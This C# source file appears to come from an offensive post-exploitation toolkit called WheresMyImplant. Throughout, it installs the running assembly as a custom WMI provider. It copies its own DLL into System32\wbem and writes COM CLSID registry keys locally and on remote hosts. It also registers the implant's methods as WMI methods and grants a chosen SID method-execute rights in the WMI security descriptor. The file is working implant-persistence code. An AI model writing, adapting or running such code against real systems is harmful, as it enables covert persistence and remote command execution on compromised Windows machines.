using System;
using System.IO;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;

using Microsoft.Win32;

namespace WheresMyImplant
{
    class InstallWMI : Base
    {
        String statusMethods;
        String statusRegistry;

        String system;
        String namespaceName;
        String providerDisplayName;

        private const UInt32 hkcrHive = 2147483648;
        private const UInt32 hklmHive = 2147483650;

        private String[] hkcrKeys;
        private String[] hklmKeys;

        private ManagementScope managementScope;
        private ManagementClass managementClass;

        private String runtimePath = RuntimeEnvironment.GetRuntimeDirectory();
        private Assembly assembly = Assembly.GetExecutingAssembly();

        //private AssemblyName systemManagementName;
        private String registryDefault;
        private String registryAssembly;
        private String registryClass;
        private String registryRuntimeVersion;

        private String providerGuid = "{" + (new Guid("54D8502C-527D-43f7-A506-A9DA075E229C").ToString().ToUpper()) + "}";
        //private String providerGuid = "{" + (new Guid("2A7B042D-578A-4366-9A3D-154C0498458E").ToString().ToUpper()) + "}";

        internal InstallWMI(String system, String namespaceName, String providerDisplayName)
        {
            this.system = system;
            this.namespaceName = namespaceName;
            this.providerDisplayName = providerDisplayName;

            //systemManagementName = AssemblyName.GetAssemblyName(String.Format("{0}{1}", runtimePath, "System.Management.Instrumentation.dll"));
            registryDefault = @"C:\Windows\System32\mscoree.dll";
            registryAssembly = @"System.Management.Instrumentation, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";//systemManagementName.FullName;
            registryClass = @"System.Management.Instrumentation.ManagedCommonProvider";
            registryRuntimeVersion = assembly.ImageRuntimeVersion;

            hkcrKeys = new String[] { 
                String.Format(@"CLSID\{0}", providerGuid.ToString()), 
                String.Format(@"WOW6432Node\CLSID\{0}", providerGuid.ToString()) 
            };
            
            hklmKeys = new String[] { 
                String.Format(@"SOFTWARE\Classes\CLSID\{0}", providerGuid.ToString()), 
                String.Format(@"SOFTWARE\Classes\WOW6432Node\CLSID\{0}", providerGuid.ToString()), 
                String.Format(@"SOFTWARE\WOW6432Node\Classes\CLSID\{0}", providerGuid.ToString()) 
            };
            
            String connectionString = String.Format(@"\\{0}\{1}", system, namespaceName);
            ConnectionOptions connectionOptions = new ConnectionOptions();
            connectionOptions.Impersonation = ImpersonationLevel.Impersonate;
            managementScope = new ManagementScope(connectionString, connectionOptions);
            managementClass = new ManagementClass(managementScope, new ManagementPath(), new ObjectGetOptions());
            managementClass["__class"] = providerDisplayName;
            managementClass.Qualifiers.Add("dynamic", true, false, true, false, true);
            managementClass.Qualifiers.Add("provider", assembly.FullName, false, false, false, true);
        }

        internal void Connect()
        {
            managementScope.Connect();
        }

        internal void GetMethods()
        {
            Type className = assembly.GetTypes()
                .Where(t => t.Namespace == "WheresMyImplant").Distinct()
                .Where(t => t.Name == "Implant").First();
            Console.WriteLine("[*] Adding Methods");

            foreach (MethodInfo methodInfo in className.GetMethods())
            {
                String methodName = methodInfo.Name;
                if (methodName == "GetType" | 
                    methodName == "Equals" | 
                    methodName == "ToString" | 
                    methodName == "GetHashCode" | 
                    methodName == "Install")
                {
                    continue;
                }
                ParameterInfo[] inputParameterInfo = methodInfo.GetParameters();

                ManagementClass inProperties = NewParameter("In");
                Int32 i = 0;
                foreach (ParameterInfo info in inputParameterInfo)
                {
                    inProperties.Properties.Add(info.Name, CimType.String, false);
                    inProperties.Properties[info.Name].Qualifiers.Add("ID", i);
                    i++;
                }
                
                ManagementClass outProperties = NewParameter("Out");
                outProperties.Properties.Add("ReturnValue", CimType.String, false);
                outProperties.Properties["ReturnValue"].Qualifiers.Add("Out", true);

                IntPtr inPtr = (IntPtr)inProperties;
                IntPtr outPtr = (IntPtr)outProperties;

                managementClass.Methods.Add(methodName, NewManagementBaseObject(inPtr), NewManagementBaseObject(outPtr));
                managementClass.Methods[methodName].Qualifiers.Add("Static", true);
                managementClass.Methods[methodName].Qualifiers.Add("Implemented", true);

                statusMethods += ".";
            }

            try
            {
                managementClass.Put();
            }
            catch (ManagementException ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }

            Console.WriteLine(statusMethods);
        }

        internal void AddRegistryLocal()
        {
            
            Console.WriteLine("[*] Adding Registry Keys");

            foreach (String key in hkcrKeys)
            {
                AddRegistryClassesRoot(key, "", registryClass);

                String keyValue2 = String.Format(@"{0}\InprocServer32", key);
                AddRegistryClassesRoot(keyValue2, "", registryDefault);
                AddRegistryClassesRoot(keyValue2, "Assembly", registryAssembly);
                AddRegistryClassesRoot(keyValue2, "Class", registryClass);
                AddRegistryClassesRoot(keyValue2, "RuntimeVersion", registryRuntimeVersion);
                AddRegistryClassesRoot(keyValue2, "ThreadingModel", "Both");
                
                String keyValue3 = String.Format(@"{0}\InprocServer32\{1}", key, "3.5.0.0");
                AddRegistryClassesRoot(keyValue3, "Assembly", registryAssembly);
                AddRegistryClassesRoot(keyValue3, "Class", registryClass);
                AddRegistryClassesRoot(keyValue3, "RuntimeVersion", registryRuntimeVersion);

                statusRegistry += ".";
            }

            foreach (String key in hklmKeys)
            {
                AddRegistryLocalMachine(key, "", registryClass);

                String keyValue2 = String.Format(@"{0}\InprocServer32", key);
                AddRegistryLocalMachine(keyValue2, "", registryDefault);
                AddRegistryLocalMachine(keyValue2, "Assembly", registryAssembly);
                AddRegistryLocalMachine(keyValue2, "Class", registryClass);
                AddRegistryLocalMachine(keyValue2, "RuntimeVersion", registryRuntimeVersion);
                AddRegistryLocalMachine(keyValue2, "ThreadingModel", "Both");
                
                String keyValue3 = String.Format(@"{0}\InprocServer32\{1}", key, "3.5.0.0");
                AddRegistryLocalMachine(keyValue3, "Assembly", registryAssembly);
                AddRegistryLocalMachine(keyValue3, "Class", registryClass);
                AddRegistryLocalMachine(keyValue3, "RuntimeVersion", registryRuntimeVersion);

                statusRegistry += ".";
            }
            Console.WriteLine(statusRegistry);
        }

        private void AddRegistryClassesRoot(String strKey, String value, String data)
        {
            try
            {
                using (RegistryKey key = Registry.ClassesRoot.CreateSubKey(strKey))
                {
                    key.SetValue(value, data);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        private void AddRegistryLocalMachine(String strKey, String value, String data)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(strKey))
                {
                    key.SetValue(value, data);
                }
            }
            catch(Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        internal void AddRegistryRemote(String[] keys, UInt32 hive)
        {
            using (WMI wmi = new WMI())
            {
                if (!wmi.Connect())
                {
                    Console.WriteLine("[-] Connection failed");
                    return;
                }
                foreach (String key in keys)
                {
                    wmi.ExecuteMethod("StdRegProv", "CreateKey", new Object[] { hive, key });
                    wmi.ExecuteMethod("StdRegProv", "CreateKey", new Object[] { hive, key, "", registryDefault });

                    String keyValue2 = String.Format(@"{0}\InprocServer32", key);
                    wmi.ExecuteMethod("StdRegProv", "CreateKey", new Object[] { hive, keyValue2, "", registryDefault });
                    wmi.ExecuteMethod("StdRegProv", "CreateKey", new Object[] { hive, keyValue2, "Assembly", registryAssembly });
                    wmi.ExecuteMethod("StdRegProv", "CreateKey", new Object[] { hive, keyValue2, "Class", registryClass });
                    wmi.ExecuteMethod("StdRegProv", "CreateKey", new Object[] { hive, keyValue2, "RuntimeVersion", registryRuntimeVersion });
                    wmi.ExecuteMethod("StdRegProv", "CreateKey", new Object[] { hive, keyValue2, "ThreadingModel", "Both" });

                    String keyValue3 = String.Format(@"{0}\InprocServer32\{1}", key, "3.5.0.0");
                    wmi.ExecuteMethod("StdRegProv", "CreateKey", new Object[] { hive, keyValue3, "Assembly", registryAssembly });
                    wmi.ExecuteMethod("StdRegProv", "CreateKey", new Object[] { hive, keyValue3, "Class", registryClass });
                    wmi.ExecuteMethod("StdRegProv", "CreateKey", new Object[] { hive, keyValue3, "RuntimeVersion", registryRuntimeVersion });
                }
            }
        }

        internal void CopyDll()
        {
            String filename = Assembly.GetExecutingAssembly().CodeBase;
            UriBuilder uri = new UriBuilder(filename);
            String filePath = Uri.UnescapeDataString(uri.Path);

            Byte[] fileBytes;
            using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (BinaryReader binaryReader = new BinaryReader(fileStream))
                {
                    fileBytes = new Byte[binaryReader.BaseStream.Length];
                    binaryReader.Read(fileBytes, 0, (Int32)binaryReader.BaseStream.Length);
                }
            }

            String destination = Environment.GetEnvironmentVariable("WINDIR") + @"\System32\wbem\" + Assembly.GetExecutingAssembly().GetName().Name + ".dll";
            using (FileStream fileStream = new FileStream(destination, FileMode.OpenOrCreate))
            {
                using (BinaryWriter binaryWriter = new BinaryWriter(fileStream))
                {
                    binaryWriter.Write(fileBytes, 0, fileBytes.Length);
                }
            }
            Console.WriteLine("[+] Copied assembly to {0}", destination);
            fileBytes = null;
        }

        private ManagementBaseObject NewManagementBaseObject(IntPtr tempPtr)
        {
            AssemblyName name = AssemblyName.GetAssemblyName(RuntimeEnvironment.GetRuntimeDirectory() + "System.Management.dll");
            Type IWbemClassObjectFreeThreaded = Type.GetType("System.Management.IWbemClassObjectFreeThreaded, " + name.FullName);
            ConstructorInfo IWbemClassObjectFreeThreaded_ctor = IWbemClassObjectFreeThreaded.GetConstructors().First();
            Object IWbemClassObjectFreeThreadedInstance = IWbemClassObjectFreeThreaded_ctor.Invoke(new Object[] { tempPtr });

            Type ManagementBaseObject = Type.GetType("System.Management.ManagementBaseObject, " + name.FullName);
            ConstructorInfo[] ManagementBaseObject_ctor = ManagementBaseObject.GetConstructors(BindingFlags.NonPublic | BindingFlags.Instance);
            return (ManagementBaseObject)ManagementBaseObject_ctor.Last().Invoke(new Object[] { IWbemClassObjectFreeThreadedInstance });
        }

        private ManagementClass NewParameter(String direction)
        {
            ObjectGetOptions options = new ObjectGetOptions();
            ManagementClass __PARAMETERS = new ManagementClass(@"ROOT\cimv2", "__PARAMETERS", null);
            ManagementClass parameters = (ManagementClass)__PARAMETERS.Clone();
            parameters.Qualifiers.Add(direction, true);
            return parameters;
        }

        internal void ExtensionProviderSetup()
        {
            Console.WriteLine("Creating WMI_extension");
            using (ManagementClass __Win32Provider = new ManagementClass(@"ROOT\cimv2", "__Win32Provider", null))
            {
                using (ManagementClass WMI_extension = __Win32Provider.Derive("WMI_extension"))
                {
                    WMI_extension.Properties["Name"].Value = null;
                    WMI_extension.Properties["ClsId"].Value = providerGuid;
                    WMI_extension.Properties["Version"].Value = 1;
                    WMI_extension.Properties["HostingModel"].Value = "Decoupled:COM";
                    WMI_extension.Properties["SecurityDescriptor"].Value = null;
                    WMI_extension.Properties.Add("AssemblyName", CimType.String, false);
                    WMI_extension.Properties.Add("AssemblyPath", CimType.String, false);
                    WMI_extension.Properties.Add("CLRVersion", CimType.String, false);
                    try
                    {
                        WMI_extension.Put();
                    }
                    catch (ManagementException ex)
                    {
                        Console.WriteLine("[-] {0}", ex.Message);
                    }
                }
            }

            Console.WriteLine("Registering " + Assembly.GetExecutingAssembly().GetName().Name + " as a WMI_extension Instance");
            ManagementPath managementPath = null;
            using (ManagementClass WMI_extension = new ManagementClass(@"ROOT\cimv2", "WMI_extension", null))
            {
                using (ManagementObject managementObject = WMI_extension.CreateInstance())
                {
                    managementObject.SetPropertyValue("AssemblyName", assembly.FullName);
                    managementObject.SetPropertyValue("AssemblyPath", "file:///C:/Windows/System32/wbem/" + Assembly.GetExecutingAssembly().GetName().Name + ".dll");
                    managementObject.SetPropertyValue("CLRVersion", assembly.ImageRuntimeVersion);
                    managementObject.SetPropertyValue("CLSID", providerGuid);
                    managementObject.SetPropertyValue("HostingModel", "LocalSystemHost:CLR2.0");
                    managementObject.SetPropertyValue("Name", assembly.FullName);
                    try
                    {
                        managementPath = managementObject.Put();
                    }
                    catch (ManagementException ex)
                    {
                        Console.WriteLine("WMI_extension: " + ex.Message);
                    }
                }
            }

            Console.WriteLine("Registering " + providerDisplayName + " as an Instance Provider");
            using (ManagementClass __InstanceProviderRegistration = new ManagementClass(@"ROOT\cimv2", "__InstanceProviderRegistration", null))
            {
                using (ManagementObject managementObject = __InstanceProviderRegistration.CreateInstance())
                {
                    managementObject.SetPropertyValue("Provider", managementPath);
                    managementObject.SetPropertyValue("SupportsGet", true);
                    managementObject.SetPropertyValue("SupportsPut", true);
                    managementObject.SetPropertyValue("SupportsDelete", true);
                    managementObject.SetPropertyValue("SupportsEnumeration", true);
                    try
                    {
                        managementObject.Put();
                    }
                    catch (ManagementException ex)
                    {
                        Console.WriteLine("__InstanceProviderRegistration: " + ex.Message);
                    }
                }
            }

            Console.WriteLine("Registering " + providerDisplayName + " as an Method Provider");
            using (ManagementClass __MethodProviderRegistration = new ManagementClass(@"ROOT\cimv2", "__MethodProviderRegistration", null))
            {
                using (ManagementObject managementObject = __MethodProviderRegistration.CreateInstance())
                {
                    managementObject.SetPropertyValue("Provider", managementPath);
                    try
                    {
                        managementObject.Put();
                    }
                    catch (ManagementException ex)
                    {
                        Console.WriteLine("__MethodProviderRegistration: " + ex.Message);
                    }
                }
            }
        }

        internal void SetPermissions(String sid)
        {
            WMI wmi = new WMI();
            ManagementObject trusteeInstance = wmi.CreateInstance("Win32_Trustee");
            trusteeInstance["SidString"] = sid;

            ManagementObject aceInstance = wmi.CreateInstance("Win32_ACE");
            aceInstance["AceFlags"] = (uint)WMI.AceFlags.CONTAINER_INHERIT_ACE_FLAG + (uint)WMI.AceFlags.OBJECT_INHERIT_ACE_FLAG;
            aceInstance["AccessMask"] = WMI.AccessMask.WBEM_METHOD_EXECUTE;
            aceInstance["AceType"] = WMI.AceType.ACCESS_ALLOWED_ACE_TYPE;
            aceInstance["Trustee"] = trusteeInstance;

            ManagementBaseObject aclInstance = (ManagementBaseObject)wmi.ExecuteMethod2("__SystemSecurity", "GetSecurityDescriptor", new Object[] { });
            ManagementBaseObject descriptor = aclInstance.Properties["Descriptor"].Value as ManagementBaseObject;
            ManagementBaseObject[] dacl = descriptor["DACL"] as ManagementBaseObject[];
            Array.Resize(ref dacl, dacl.Length + 1);
            dacl[dacl.Length - 1] = aceInstance;
            descriptor["DACL"] = dacl;

            wmi.ExecuteMethod("__SystemSecurity", "SetSecurityDescriptor", new Object[] { descriptor });
        }
    }
}